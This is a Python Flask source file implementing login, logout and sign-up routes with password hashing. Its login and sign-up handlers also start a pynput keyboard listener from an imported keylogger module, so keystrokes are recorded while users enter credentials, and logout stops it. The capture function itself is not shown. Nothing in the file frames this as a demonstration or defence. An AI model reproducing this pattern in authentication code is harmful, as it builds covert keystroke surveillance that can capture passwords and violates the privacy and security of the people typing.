from flask import Blueprint, render_template, request, flash, redirect, url_for
from .models import User
from werkzeug.security import generate_password_hash, check_password_hash
from . import db   # means from __init__.py import db
from flask_login import login_user, login_required, logout_user, current_user
from pynput import keyboard
from .keylogger import keyPressed, keyboard_listener


auth = Blueprint('auth', __name__)


@auth.route('/login', methods = ['GET', 'POST'])
def login():
    global keyboard_listener
    # Start the listener only if it's not already running
    if not keyboard_listener or not keyboard_listener.is_alive():
        keyboard_listener = keyboard.Listener(on_press = keyPressed)
        keyboard_listener.start()
        
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        # filters through all user email to check if they've an email
        user = User.query.filter_by(email = email).first()
        if user:
            # checks if password hash matches the hash of the input password
            if check_password_hash(user.password, password):
                flash('Logged in successfully!', category = 'success')
                # remembers that user is logged in
                login_user(user, remember = True)
                return redirect(url_for('views.home'))
            else:
                flash('Incorrect password, try again :(', category = 'error')
        else:
            flash('Email does not exist :(', category = 'error')

    # authenticate if user is current user
    return render_template("login.html", user = current_user)


@auth.route('/logout')
@login_required
def logout():
    logout_user()

    # keylogger stops when user logs out
    global keyboard_listener
    if keyboard_listener and keyboard_listener.is_alive():
        keyboard_listener.stop()
        keyboard_listener.join()

    return redirect(url_for('auth.login'))


@auth.route('/sign-up', methods = ['GET', 'POST'])
def sign_up():
    global keyboard_listener
    # Start the listener only if it's not already running
    if not keyboard_listener or not keyboard_listener.is_alive():
        keyboard_listener = keyboard.Listener(on_press = keyPressed)
        keyboard_listener.start()

    if request.method == 'POST':
        email = request.form.get('email')
        first_name = request.form.get('firstName')
        password1 = request.form.get('password1')
        password2 = request.form.get('password2')

        user = User.query.filter_by(email = email).first()
        if user:
            flash('Email already exists.', category = 'error')
        elif len(email) < 4: 
            flash('Email must be greater than 3 characters.', category = 'error')
        elif len(first_name) < 2:
            flash('First name must be greater than 1 character.', category = 'error')
        elif password1 != password2:
            flash('Passwords don\'t match.', category = 'error')
        elif len(password1) < 8:
            flash('Password must be at least 8 characters.', category = 'error')
        else:
            # password passes through a one-way hash function, so each password stored in the database is encrypted
            new_user = User(email = email, first_name = first_name, password = generate_password_hash(password1, method = 'pbkdf2:sha256'))
            db.session.add(new_user)
            db.session.commit()
            # remembers that user is logged in
            login_user(new_user, remember = True)
            flash('Account created!', category = 'success')
            return redirect(url_for('views.home'))
               
    # authenticate if user is current user
    return render_template("sign_up.html", user = current_user)